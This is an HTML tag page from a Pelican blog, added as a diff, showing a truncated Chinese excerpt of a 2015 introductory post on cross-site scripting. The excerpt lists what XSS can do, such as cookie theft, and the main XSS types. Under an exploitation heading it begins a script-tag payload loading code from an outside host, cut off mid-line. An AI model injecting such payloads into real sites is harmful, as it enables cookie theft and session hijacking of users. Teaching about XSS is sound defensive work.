@@ -1,0 +1,149 @@
+
+<!DOCTYPE html>
+<html lang="chinese (simplified)">
+<head>
+  <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700,400italic' rel='stylesheet' type='text/css'>
+
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="/theme/pygments/github.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/font-awesome.min.css">
+
+
+
+
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="" />
+
+
+    <meta name="author" content="nnnnn" />
+    <meta name="description" content="" />
+<meta property="og:site_name" content="mmmm"/>
+<meta property="og:type" content="blog"/>
+<meta property="og:title" content="mmmm"/>
+<meta property="og:description" content=""/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content=""/>
+
+  <title>mmmm &ndash;     Tag xss
+</title>
+
+</head>
+<body>
+  <aside>
+    <div>
+      <a href="">
+        <img src="/theme/img/profile.png" alt="" title="">
+      </a>
+      <h1><a href=""></a></h1>
+
+
+      <nav>
+        <ul class="list">
+          <li><a href="/pages/about-me.html#about-me">About Me</a></li>
+
+          <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+          <li><a href="http://python.org/" target="_blank">Python.org</a></li>
+          <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
+          <li><a href="#" target="_blank">You can modify those links in your config file</a></li>
+        </ul>
+      </nav>
+
+      <ul class="social">
+        <li><a class="sc-You can add links in your config file" href="#" target="_blank"><i class="fa fa-You can add links in your config file"></i></a></li>
+        <li><a class="sc-Another social link" href="#" target="_blank"><i class="fa fa-Another social link"></i></a></li>
+      </ul>
+    </div>
+
+
+  </aside>
+  <main>
+
+
+
+
+<article>
+  <header>
+    <h2><a href="/xss.html#xss">xss</a></h2>
+    <p>
+          Posted on 周五 27 二月 2015 in <a href="/category/misc.html">misc</a>
+
+
+          &#8226;     Tagged with
+
+              <a href="/tag/xss.html">xss</a>
+    </p>
+  </header>
+  <div>
+      <hr>
+<h2>xss是什么</h2>
+<p>跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<h2>xss可以做什么</h2>
+<ul>
+<li>盗取cookie</li>
+<li>挂马</li>
+<li>XSS Worm</li>
+<li>等</li>
+</ul>
+<h2>xss分类</h2>
+<ul>
+<li>反射性 xss</li>
+<li>储存型 xss<ul>
+<li>提交的xss代码会储存在服务器</li>
+<li>如留言板xss，xss代码储存到数据库，当有用户查看包含xss代码的浏览时代码就会被执行</li>
+<li>储存型xss最隐蔽</li>
+</ul>
+</li>
+<li>DOM xss<ul>
+<li>不需要服务器解析，依靠浏览器端DOM解析</li>
+</ul>
+</li>
+<li>flash xss<ul>
+<li>利用flash文件缺陷执行js脚本，一般为反射性xss</li>
+</ul>
+</li>
+<li>mxss<ul>
+<li>又叫突变xss，主要用于绕过xss过滤</li>
+</ul>
+</li>
+</ul>
+<h2>xss利用</h2>
+<div class="highlight"><pre><span></span>    <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://b.ioio.pub …</span></pre></div>
+      <br>
+      <a class="btn" href="/xss.html#xss">    Continue reading
+</a>
+  </div>
+</article>
+
+  <div class="pagination">
+  </div>
+
+
+
+
+    <footer>
+<p>&copy; nnnnn </p>
+<p>    Powered by <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a>
+</p>    </footer>
+  </main>
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " mmmm ",
+  "url" : "",
+  "image": "",
+  "description": ""
+}
+</script>
+</body>
+</html>
